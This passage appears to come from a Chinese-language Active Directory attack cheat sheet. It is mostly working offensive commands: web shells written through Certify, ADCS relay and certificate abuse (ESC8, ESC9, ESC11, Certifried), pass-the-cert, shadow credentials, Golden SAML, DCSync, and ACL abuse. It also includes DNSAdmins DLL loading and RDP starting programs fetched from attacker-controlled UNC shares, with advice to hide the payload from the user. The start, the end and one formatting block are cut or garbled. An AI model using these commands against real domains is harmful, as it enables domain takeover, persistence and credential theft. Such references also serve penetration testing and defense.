Certify.exe writefile /ca:SERVER\ca-name /readonly

# 将aspx外壳写入本地Web目录：
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

# 将默认ASP外壳写入本地Web目录：
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

# 将PHP外壳写入远程Web目录：
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```

### ESC8 - AD CS中继攻击

> 攻击者可以使用PetitPotam触发域控制器通过NTLM中继凭据到任意主机。然后可以将域控制器的NTLM凭据中继到Active Directory证书服务（AD CS）Web注册页面，并注册DC证书。然后可以使用该证书请求TGT（票据授权票据）并通过Pass-The-Ticket危害整个域。

需要[Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)

* **版本1**：NTLM中继 + Rubeus + PetitPotam

  ```powershell
  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
  # 对于成员服务器或工作站，模板将是"Computer"。
  # 其他模板：workstation, DomainController, Machine, KerberosAuthentication
  
  # 使用petitpotam通过MS-ESFRPC EfsRpcOpenFileRaw函数强制认证
  # 您还可以使用任何其他方式强制认证，如通过MS-RPRN的PrintSpooler
  git clone https://github.com/topotam/PetitPotam
  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
  python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
  
  # 使用rubeus和证书请求TGT
  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
  
  # 现在您可以使用TGT执行DCSync
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **版本2**：NTLM中继 + Mimikatz + Kekeo

  ```powershell
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  
  # Mimikatz
  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth
  
  # Kekeo
  kekeo> base64 /input:on
  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
  
  # Mimikatz
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **版本3**：Kerberos中继

  ```ps1
  # 设置中继
  sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
  
  # 运行mitm6
  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
  ```

* **版本4**：ADCSPwn - 需要在域控制器上运行`WebClient`服务。默认情况下，此服务未安装。

```powershell
https://github.com/bats3c/ADCSPwn
adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local

# ADCSPwn arguments
adcs            -       This is the address of the AD CS server which authentication will be relayed to.
secure          -       Use HTTPS with the certificate service.
port            -       The port ADCSPwn will listen on.
remote          -       Remote machine to trigger authentication from.
username        -       Username for non-domain context.
password        -       Password for non-domain context.
dc              -       Domain controller to query for Certificate Templates (LDAP).
unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
output          -       Output path to store base64 generated crt.
```

* **版本5**: Certipy ESC8

  ```ps1
  certipy relay -ca 172.16.19.100
  ```

### ESC9 - 无安全扩展

**要求**

* `StrongCertificateBindingEnforcement` 设置为 `1`（默认值）或 `0`
* 证书在 `msPKI-Enrollment-Flag` 值中包含 `CT_FLAG_NO_SECURITY_EXTENSION` 标志
* 证书指定 `Any Client` 认证 EKU
* 通过任何账户 A 的 `GenericWrite` 来危害任何账户 B

**场景**

John@corp.local 对 Jane@corp.local 有 **GenericWrite** 权限，我们想要危害 Administrator@corp.local。
Jane@corp.local 被允许注册指定了 **CT_FLAG_NO_SECURITY_EXTENSION** 标志的证书模板 ESC9。

* 使用我们的 GenericWrite 获取 Jane 的带有影子凭据的哈希

  ```ps1
  certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
  ```

* 将 Jane 的 **userPrincipalName** 更改为 Administrator。:warning: 保留 `@corp.local` 部分

  ```ps1
  certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
  ```

* 从 Jane 的账户请求易受攻击的证书模板 ESC9。

  ```ps1
  certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
  # 证书中的 userPrincipalName 是 Administrator
  # 颁发的证书不包含 "object SID"
  ```

* 将 Jane 的 userPrincipalName 还原为 Jane@corp.local。

  ```ps1
  certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
  ```

* 使用证书进行身份验证并接收 Administrator@corp.local 用户的 NT 哈希。

  ```ps1
  certipy auth -pfx administrator.pfx -domain corp.local
  # 由于证书中没有指定域，所以在命令行中添加 -domain <domain>。
  ```

### ESC11 - 将 NTLM 中继到 ICPR

> 对于 ICPR 请求，不强制加密，并且请求处理设置为颁发

要求：

* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy 分支
* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket 分支

利用：

1. 在 `certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout` 输出中查找 `Enforce Encryption for Requests: Disabled`

2. 使用 Impacket ntlmrelay 设置中继并触发到它的连接。

   ```ps1
   ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
   ```

### Certifried CVE-2022-26923

> 经过身份验证的用户可以操纵他们拥有或管理的计算机账户的属性，并从 Active Directory 证书服务获取允许特权提升的证书。

* 查找 `ms-DS-MachineAccountQuota`

  ```ps1
  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota 
  ```

* 在 Active Directory 中添加一台新计算机，默认情况下 `MachineAccountQuota = 10`

  ```ps1
  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
  certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
  ```

* [替代方案] 如果你是 `SYSTEM` 并且 `MachineAccountQuota=0`：使用当前机器的票证并重置其 SPN

  ```ps1
  Rubeus.exe tgtdeleg
  export KRB5CCNAME=/tmp/ws02.ccache
  python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
  ```

* 将 `dNSHostName` 属性设置为与域控制器主机名匹配

  ```ps1
  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
  ```

* 请求一个票证

  ```ps1
  # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
  certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
  ```

* 要么使用 pfx，要么在你的机器账户上设置 RBCD 来接管域

```ps1
certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

openssl pkcs12 -in dc.pfx -out dc.pem -nodes
python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
```

文档：
### 传递证书

> 通过传递证书来获取TGT，这种技术在“UnPAC the Hash”和“Shadow Credential”中使用。

* Windows

  ```ps1
  # 查看证书文件的信息
  certutil -v -dump admin.pfx
  
  # 从Base64编码的PFX文件
  Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
  
  # 授予用户DCSync权限
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
  # 恢复
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
  ```

* Linux

  ```ps1
  # Base64编码的PFX证书（字符串）（可以设置密码）
  gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # PEM证书（文件）+ PEM私钥（文件）
  gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # PFX证书（文件）+ 密码（字符串，可选）
  gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # 使用Certipy
  certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
  certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
  ```


## UnPAC The Hash

使用**UnPAC The Hash**方法，您可以通过其证书检索用户的NT哈希。

* Windows

  ```ps1
  # 使用证书请求票据并使用/getcredentials检索PAC中的NT哈希。
  Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
  ```

* Linux

  ```ps1
  # 通过验证PKINIT预认证获取TGT
  $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # 使用会话密钥恢复NT哈希
  $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP加密密钥' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
  ```


## Shadow Credentials

> 向目标用户/计算机对象的属性`msDS-KeyCredentialLink`添加**密钥凭据**，然后使用PKINIT作为该帐户执行Kerberos身份验证以获取该用户的TGT。在尝试使用PKINIT进行预认证时，KDC将检查认证用户是否知道匹配的私钥，如果匹配，则发送TGT。

:warning: 用户对象无法编辑自己的`msDS-KeyCredentialLink`属性，而计算机对象可以。计算机对象可以编辑自己的msDS-KeyCredentialLink属性，但只有在尚不存在KeyCredential时才能添加。

**要求**：

* 域控制器至少运行Windows Server 2016
* 域必须配置了Active Directory `Certificate Services` 和 `Certificate Authority`
* PKINIT Kerberos身份验证
* 具有写入目标对象`msDS-KeyCredentialLink`属性的委托权限的帐户

**利用**：

- 从Windows使用[Whisker](https://github.com/eladshamir/Whisker)：

  ```powershell
  # 列出目标对象的msDS-KeyCredentialLink属性的所有条目。
  Whisker.exe list /target:computername$
  # 生成公私钥对并将新的密钥凭据添加到目标对象，就好像用户从新设备注册到WHfB一样。
  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
  # 根据DeviceID GUID从目标对象中删除密钥凭据。
  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
  ```

- 从Linux使用[pyWhisker](https://github.com/ShutdownRepo/pyWhisker)：

  ```bash
  # 列出目标对象的msDS-KeyCredentialLink属性的所有条目。
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
  # 生成公私钥对并将新的密钥凭据添加到目标对象，就好像用户从新设备注册到WHfB一样。
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
  # 根据DeviceID GUID从目标对象中删除密钥凭据。
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
  ```

**场景**：

- **场景1**：影子凭证中继

  - 从`DC01`触发NTLM身份验证（PetitPotam）
  - 将其转发到`DC02`（ntlmrelayx）
  - 编辑`DC01`的属性以创建Kerberos PKINIT预认证后门（pywhisker）
  - 或者：`ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`

- **场景2**：通过RBCD控制工作站

  ```ps1
  # 仅适用于C2：从8081端口添加反向端口转发到Team Server的81端口
  
  # 设置ntlmrelayx以将来自目标工作站的身份验证转发到DC 
  proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
  
  # 执行打印机错误以触发来自目标工作站的身份验证 
  proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
  
  # 使用新获得的证书通过PKINIT获取TGT 
  proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
  
  # 获取目标帐户的ST（服务票据） 
  proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
  
  # 利用ST进行未来活动 
  export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
  ```

## Active Directory Groups 

###危险的内置组使用

如果您不希望修改后的ACL每小时被覆盖，您应该更改对象`CN=AdminSDHolder,CN=System`上的ACL模板或为目标对象设置`"adminCount`属性为`0`。

> 当用户被分配到任何特权组时，AdminCount属性会自动设置为`1`，但当用户从这些组中移除时，它永远不会自动取消设置。

查找`AdminCount=1`的用户。

```powershell
crackmapexec ldap 10.10.10.10 -u username -p password --admin-count
# or
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.10.10.10
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
# or
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
# or
([adsisearcher]"(AdminCount=1)").findall()
```

### AdminSDHolder滥用

> AdminSDHolder对象的访问控制列表（ACL）被用作模板，以复制权限到Active Directory中所有“受保护组”及其成员。受保护组包括特权组，如Domain Admins、Administrators、Enterprise Admins和Schema Admins。

如果您修改了**AdminSDHolder**的权限，该权限模板将在一小时内由`SDProp`自动推送到所有受保护账户。
例如：如果有人试图在一小时内或更短时间内从Domain Admins中删除此用户，该用户将重新回到该组。

```powershell
# 将用户添加到AdminSDHolder组：
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose

# 使用账户titi重置toto的密码的权利
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword

# 授予所有权利
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
```

### 滥用DNS管理员组

> DNSAdmins组的成员可以使用dns.exe（系统）的权限加载任意DLL。

:warning: 需要重启DNS服务的权限。

* 枚举DNSAdmins组的成员

  ```ps1
  Get-NetGroupMember -GroupName "DNSAdmins"
  Get-ADGroupMember -Identity DNSAdmins
  ```

* 更改DNS服务加载的dll

  ```ps1
  # 使用RSAT
  dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
  dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll
  
  # 使用DNSServer模块
  $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
  $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
  Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
  ```

* 检查上一个命令是否成功

  ```ps1
  Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
  ```

* 重启DNS

  ```ps1
  sc \\dc01 stop dns
  sc \\dc01 start dns
  ```

### 滥用架构管理员组

> Schema Admins组是Microsoft Active Directory中的一个安全组，为其成员提供更改Active Directory林架构的能力。架构定义了Active Directory数据库的结构，包括用于存储目录中用户、组、计算机和其他对象信息的属性和对象类。

### 滥用备份操作员组

> 备份操作员组的成员可以备份和还原计算机上的所有文件，无论保护这些文件的权限如何。备份操作员还可以登录并关闭计算机。该组不能被重命名、删除或移动。默认情况下，这个内置组没有成员，并且可以在域控制器上执行备份和还原操作。

该组授予以下特权：

- SeBackup特权
- SeRestore特权

* 获取组成员：

  ```ps1
  PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
  ```

* 使用[giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)启用特权

  ```ps1
  Import-Module .\SeBackupPrivilegeUtils.dll
  Import-Module .\SeBackupPrivilegeCmdLets.dll
  
  Set-SeBackupPrivilege
  Get-SeBackupPrivilege
  ```

* 检索敏感文件

  ```ps1
  Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
  ```

* 检索HKLM\SOFTWARE注册表项中的AutoLogon内容

  ```ps1
  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
  $winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
  $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
  ```

* 检索SAM、SECURITY和SYSTEM注册表项

  * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
  * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`

文档：
## AD域联合服务

### ADFS - Golden SAML

**要求**：

* ADFS服务账户
* 私钥（带解密密码的PFX）

**利用**：

* 以AD FS服务账户身份在AD FS服务器上运行[mandiant/ADFSDump](https://github.com/mandiant/ADFSDump)。它将查询Windows内部数据库（WID）：`\\.\pipe\MICROSOFT##WID\tsql\query`

* 将PFX和私钥转换为二进制格式

  ```ps1
  # 对于pfx
  echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
  # 对于私钥
  echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
  ```

* 使用[mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof)创建Golden SAML，您可能需要更新[依赖项](https://github.com/szymex73/ADFSpoof)。

  ```ps1
  mkdir ADFSpoofTools
  cd $_
  git clone https://github.com/dmb2168/cryptography.git
  git clone https://github.com/mandiant/ADFSpoof.git 
  virtualenv3 venvADFSSpoof
  source venvADFSSpoof/bin/activate
  pip install lxml
  pip install signxml
  pip uninstall -y cryptography
  cd cryptography
  pip install -e .
  cd ../ADFSpoof
  pip install -r requirements.txt
  python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
  /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
  ```

其他利用AD FS的有趣工具： 

* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)


## AD域集成DNS

ADIDNS区域DACL（自主访问控制列表）默认允许普通用户创建子对象，攻击者可以利用这一点劫持流量。AD域需要通过其DNS动态更新协议同步LDAP更改，这需要一些时间（约180秒）。

* 使用[dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)枚举所有记录

  ```ps1
  adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
  ```

* 使用[dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)查询节点

  ```ps1
  dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
  ```

* 添加节点并附加记录

  ```ps1
  dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
  ```

常见的滥用ADIDNS的方法是设置通配符记录，然后被动监听网络。

```ps1
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```


## 滥用AD域ACLs/ACEs

使用[ADACLScanner](https://github.com/canix1/ADACLScanner)检查用户的ACL。

```powershell
ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
```

### GenericAll

* **用户上的GenericAll**：我们可以在不知道当前密码的情况下重置用户的密码

* **组上的GenericAll**：实际上，这允许我们将自己（黑客用户）添加到域管理员组： 

  * 在Windows上：`net group "domain admins" hacker /add /domain`
  * 在Linux上：
    * 使用Samba软件套件： 
      `net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]`
    * 使用bloodyAD： 
      `bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'`

* **GenericAll/GenericWrite**：我们可以在目标账户上设置**SPN**，请求服务票证（ST），然后获取其哈希并进行Kerberoasting。

  ```powershell
  # 检查账户上的有趣权限：
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  
  # 检查当前用户是否已经设置了SPN：
  PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
  
  # 强制在账户上设置SPN：针对性Kerberoasting
  PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
  
  # 获取票证
  PowerView2 > $User = Get-DomainUser username 
  PowerView2 > $User | Get-DomainSPNTicket | fl
  PowerView2 > $User | Select serviceprincipalname
  
  # 移除SPN
  PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
  ```

* **GenericAll/GenericWrite**：我们可以更改受害者的**userAccountControl**以不要求Kerberos预验证，获取用户的可破解AS-REP，然后将设置更改回来。

  * 在Windows上：

  ```powershell
  # 修改userAccountControl
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
  
  # 获取票证
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
  
  # 设置回userAccountControl
  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  ```

  * 在Linux上：

  ```bash
  # 修改userAccountControl
  $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
  
  # 获取票证
  $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
  
  # 设置回userAccountControl
  $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
  ```


### GenericWrite

* 重置另一个用户的密码
  * 在Windows上：

```powershell
# https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
$user = 'DOMAIN\user1'; 
$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
```


* 在Linux上：

  ```bash
  # 使用Samba软件套件中的rpcclient
  rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
  
  # 使用带密码哈希的bloodyAD
  bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
  ```

* 在ObjectType上使用WriteProperty，在这个特定案例中是Script-Path，允许攻击者覆盖委托用户的登录脚本路径，这意味着下一次，当用户代表登录时，他们的系统将执行我们的恶意脚本：`Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`"

#### GenericWrite和远程连接管理器

> 假设你在一个仍然积极使用启用了RCM的Windows服务器版本的Active Directory环境中，或者你能够在被攻破的RDSH上启用RCM，我们能做些什么呢？在Active Directory中，每个用户对象都有一个名为‘Environment’的选项卡。
>
> 该选项卡包括一些设置，这些设置可以用于更改用户通过远程桌面协议（RDP）连接到TS/RDSH时启动的程序，而不是正常的图形环境。‘Starting program’字段中的设置基本上就像是一个windows快捷方式，允许您提供一个本地或远程（UNC）路径到一个可执行文件，该文件应在连接到远程主机时启动。在登录过程中，这些值将由RCM进程查询并运行定义的任何可执行文件。 - https://sensepost.com/blog/2020/ace-to-rce/

:warning: RCM仅在终端服务器/远程桌面会话主机上激活。在较新版本的Windows（>2016）上，RCM已被禁用，需要更改注册表才能重新启用。

```powershell
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
$UserObject.TerminalServicesWorkDirectory = "C:\"
$UserObject.SetInfo()
```

注意：为了不提醒用户，有效载荷应隐藏自己的进程窗口并生成正常的图形环境。

### WriteDACL

要滥用`WriteDacl`到域对象，你可以为自己授予DcSync权限。通过应用以下扩展权限复制目录更改/复制所有目录更改，可以将任何给定账户添加为域的复制伙伴。[Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)是一个自动化发现和利用Active Directory中不安全配置的ACL的工具：`./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`

* 对域进行WriteDACL操作：

  * 在Windows上：

    ```powershell
    # 为主身份授予DCSync权限
    Import-Module .\PowerView.ps1
    $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
    Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
    ```

    * 在Linux上：

    ```bash
    # 文档未提供Linux上的具体命令
    ```

  # 为主身份授予DCSync权限

  bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2

  # 在DCSync后移除权限

  bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False

* 对组进行WriteDACL操作

  ```powershell
  Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
  net group "INTERESTING_GROUP" User1 /add /domain
  ```

  或者

  ```powershell
  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
  
  # 移除权限
  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
  ```

### WriteOwner

攻击者可以更新目标对象的所有者。一旦对象所有者更改为攻击者控制的主体，攻击者就可以按照他们认为合适的方式操纵对象。这可以通过Set-DomainObjectOwner（PowerView模块）实现。

```powershell
Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
```

或者

```powershell
